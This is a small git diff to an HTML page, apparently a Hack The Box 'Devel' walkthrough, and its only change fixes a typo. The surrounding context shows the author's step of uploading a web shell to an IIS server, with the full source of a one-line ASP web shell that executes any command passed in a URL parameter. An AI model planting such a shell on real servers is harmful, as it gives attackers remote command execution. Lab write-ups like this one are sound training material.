@@ -58,7 +58,7 @@ layout: default
     <br>
     <h2><a id="iis_apppool\web">Shell - iis apppool\web</a></h2>
 
-    <li>I have now confirmed that we are able to upload files to the web server and access them.  This time I will upload a web shell.  It is an IIS server so I will use an asp webshell.  aspx would probably would work.</li>
+    <li>I have now confirmed that we are able to upload files to the web server and access them.  This time I will upload a web shell.  It is an IIS server so I will use an asp webshell.  aspx would probably also work.</li>
 
     <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ cat shell.asp      &#13;&#10;&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;&#13;&#10;    </pre>
 
